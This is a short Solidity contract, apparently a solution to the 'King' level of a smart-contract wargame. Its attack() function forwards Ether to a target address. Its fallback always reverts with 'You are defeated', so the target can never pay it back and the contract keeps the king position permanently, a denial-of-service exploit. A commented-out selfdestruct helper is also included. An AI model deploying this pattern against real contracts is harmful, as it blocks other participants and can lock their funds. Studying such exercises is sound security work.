
pragma solidity ^0.6.4;

contract king {

  function attack(address addr) public payable {
    (bool result, ) = addr.call{value:msg.value}("");
    
  }
  
   fallback() external payable {  // fallback function that will revert everytime.
        revert("You are defeated");
    }



          
   /* function destruct(address payable _a) public{
      selfdestruct(_a);
    }*/

}
